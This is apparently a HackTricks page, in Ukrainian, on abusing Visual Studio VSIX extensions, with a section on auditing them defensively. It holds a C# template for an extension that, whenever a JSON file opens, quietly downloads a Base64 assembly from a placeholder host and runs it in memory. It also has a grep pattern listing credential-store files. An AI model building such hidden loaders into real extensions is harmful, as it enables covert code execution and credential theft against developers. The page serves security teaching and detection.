# Зловживання розширеннями Visual Studio VSIX

{{#include ../banners/hacktricks-training.md}}

Розширення Visual Studio може перетворити звичайну роботу в редакторі на виконання коду від імені користувача, який увійшов у систему. Зловмисний VSIX, видавець-двійник або скомпрометоване оновлення розширення можуть дістатися до цього користувача через звичайні канали встановлення. Встановлення після запиту адміністратора — це встановлення за згодою користувача, а не автоматичне підвищення привілеїв.<sup>[[1]](#references)</sup>

## Модель виконання

Розширення класичного VSSDK зазвичай виконуються всередині `devenv.exe`. Новіша модель `VisualStudio.Extensibility` переважно запускає сучасні розширення .NET поза процесом: Visual Studio передає виклики спеціальному процесу `Microsoft.ServiceHub.Host.Extensibility`, що ізолює стабільність IDE, але **не** обмежує розширення пісочницею щодо дозволів користувача Windows. Точне ім’я виконуваного файла може містити суфікс архітектури, наприклад `ServiceHub.Host.Extensibility.arm64.exe`.<sup>[[1]](#references)[[2]](#references)</sup>

### Запуск під час звичайної роботи в редакторі

Замість того, щоб надавати лише помітну команду в меню, розширення може реалізувати `ITextViewOpenClosedListener`. Його зворотний виклик `TextViewOpenedAsync` викликається для відповідних документів, тоді як `TextViewExtensionConfiguration.AppliesTo` може обмежити активацію поширеним типом, наприклад JSON. Справжній форматер або лінтер усе ще може виконувати заявлені функції, поки друга дія запускається як побічний ефект відкриття файла.<sup>[[1]](#references)[[3]](#references)</sup>

Наведений нижче скорочений шаблон показує важливі точки виконання; для ясності він не містить легітимного форматера та обробки помилок.<sup>[[1]](#references)[[3]](#references)</sup>

<details>
<summary>Завантажувач керованої збірки в пам’яті, що запускається подією</summary>

```csharp
[VisualStudioContribution]
internal class JsonListener : ExtensionPart, ITextViewOpenClosedListener
{
    public TextViewExtensionConfiguration TextViewExtensionConfiguration => new()
    {
        AppliesTo = [DocumentFilter.FromDocumentType("json")]
    };

    public async Task TextViewOpenedAsync(ITextViewSnapshot view, CancellationToken ct)
    {
        using var http = new HttpClient();
        var encoded = (await http.GetStringAsync("https://example.invalid/update.txt", ct)).Trim();
        using var stream = new MemoryStream(Convert.FromBase64String(encoded));
        var context = new AssemblyLoadContext(Guid.NewGuid().ToString(), isCollectible: true);
        var entry = context.LoadFromStream(stream).EntryPoint
            ?? throw new InvalidOperationException("Assembly has no entry point");
        var argv = entry.GetParameters().Length == 0 ? null : new object?[] { Array.Empty<string>() };
        if (entry.Invoke(null, argv) is Task task) await task;
        context.Unload();
    }

    public Task TextViewClosedAsync(ITextViewSnapshot view, CancellationToken ct)
        => Task.CompletedTask;
}
```

</details>

Цей ланцюжок завантажує текст Base64, декодує його в байти збірки, завантажує її з `MemoryStream` через collectible `AssemblyLoadContext`, викликає відображену `EntryPoint` без параметрів або з `string[]`, очікує на асинхронні точки входу та вивантажує контекст. Другий етап не записується на диск, хоча VSIX і основна DLL розширення залишаються артефактами на диску. Base64 не забезпечує автентичності чи конфіденційності; використання HTTP також дає зловмиснику, який перехоплює трафік, змогу підмінити відповідь.<sup>[[1]](#references)</sup>

Серед операційних варіантів — придушення всіх винятків, щоб заявлена функція продовжувала працювати, якщо розгортання не вдалося, або використання `ITextViewChangedListener` для запуску після редагування. Код виконується в хості розширень і може використовувати доступні цьому користувачеві керовані API, P/Invoke, файли, облікові дані та дочірні процеси.<sup>[[1]](#references)</sup>

Про пов’язану поверхню виконання, специфічну для редактора й засновану на автоматичному завантаженні нативних плагінів, дивіться:

{{#ref}}
windows-local-privilege-escalation/notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### Зловживання довірою до Marketplace та каналів доставки

VSIX може надійти як файл, яким поділилися безпосередньо або який поширили через фішинг, із вебверсії Marketplace чи через вбудований у Visual Studio браузер Marketplace. Реєстрація видавця, яка переважно забезпечує унікальність і перевіряє список зарезервованих слів, може дозволити створювати візуально оманливі ідентифікатори видавців; ще ефективніше скомпрометувати вже довіреного видавця або розширення, оскільки це дає доступ до встановленої бази користувачів. Під час встановлення з Marketplace запускається Visual Studio Installer, а завантажений VSIX тимчасово зберігається в `%LOCALAPPDATA%\Temp`; `payload.vsix` також використовується легітимно, тому сама назва файла не є індикатором.<sup>[[1]](#references)</sup>

MDSec не виявила протоколу URL для Visual Studio, який безпосередньо встановлював би розширення. Оператору все одно потрібно, щоб користувач встановив VSIX і довірився йому, або доведеться скомпрометувати канал розповсюдження наявного розширення. Пакет `AllUsers` встановлюється в папку інсталяції Visual Studio і може вимагати підвищення привілеїв, але це звичайна поведінка інсталятора, що потребує згоди, а не автоматичний спосіб отримати права адміністратора чи SYSTEM.<sup>[[1]](#references)[[4]](#references)</sup>

### Статичний аудит у масштабі

Пакети VSIX зазвичай є ZIP-контейнерами, тому безпечний конвеєр перевірки Marketplace може перераховувати пакети, розпаковувати їх **без завантаження коду розширень**, аналізувати маніфести, визначати поверхні виконання та декомпілювати керовані збірки за допомогою `ilspycmd`. Насамперед перевіряйте збірки, що належать розширенню, виключивши поширені вбудовані залежності, а потім зіставляйте рядки, пов’язані зі сховищами облікових даних, із поведінковими кластерами, як-от читання файлів і надсилання мережею, кодування й надсилання, завантаження й виконання, звернення до менеджера облікових даних і мережевий доступ або створення знімків екрана й надсилання.<sup>[[1]](#references)[[5]](#references)</sup>

```bash
unzip -q sample.vsix -d sample-vsix
find sample-vsix -type f \( -iname '*.dll' -o -iname '*.exe' \) -print
ilspycmd -p -o decompiled sample-vsix/path/to/extension.dll
rg -n -i 'Login Data|logins\.json|key4\.db|wallet\.dat|\.aws[/\\]credentials|LoadFromStream|EntryPoint|cmd\.exe' decompiled
```

Також інвентаризуйте native DLL, цілі MSBuild, скрипти, шаблони T4 та payload інсталяторів, а не припускайте, що всі поверхні виконання — це керований код. Порівнюйте підозрілу поведінку із заявленим призначенням у маніфесті: телеметрія та легітимні засоби оновлення можуть нагадувати ексфільтрацію або staging. Перевірка лише статичним аналізом не виявляє пакований, обфускований, динамічно розв’язуваний і неактивний код, а перевірка лише останньої версії пропускає шкідливі попередні релізи.<sup>[[1]](#references)</sup>

Окрема атака під час завантаження проєкту може виконати шкідливу ціль [MSBuild `GetFrameworkPaths`](visual-studio-project-msbuild-execution.md) без встановлення VSIX.<sup>[[6]](#references)</sup>

## References

- [1] [MDSec - Повторний огляд розширень Visual Studio](https://www.mdsec.co.uk/2026/05/visual-studio-extensions-revisited/)
- [2] [Microsoft Learn - Про VisualStudio.Extensibility](https://learn.microsoft.com/en-us/visualstudio/extensibility/visualstudio.extensibility/visualstudio-extensibility?view=visualstudio)
- [3] [Microsoft Learn - ITextViewOpenClosedListener.TextViewOpenedAsync](https://learn.microsoft.com/en-us/dotnet/api/microsoft.visualstudio.extensibility.editor.itextviewopenclosedlistener.textviewopenedasync?view=vs-extensibility)
- [4] [Microsoft Learn - Структура пакета VSIX](https://learn.microsoft.com/en-us/visualstudio/extensibility/anatomy-of-a-vsix-package?view=visualstudio)
- [5] [ILSpy - інструмент .NET ilspycmd](https://github.com/icsharpcode/ILSpy/blob/master/ICSharpCode.ILSpyCmd/README.md)
- [6] [Unit 42 - Кампанія Blinder Tunnel націлена на інфраструктуру Іраку](https://unit42.paloaltonetworks.com/blinder-tunnel-targets-critical-infrastructure/)
{{#include ../banners/hacktricks-training.md}}
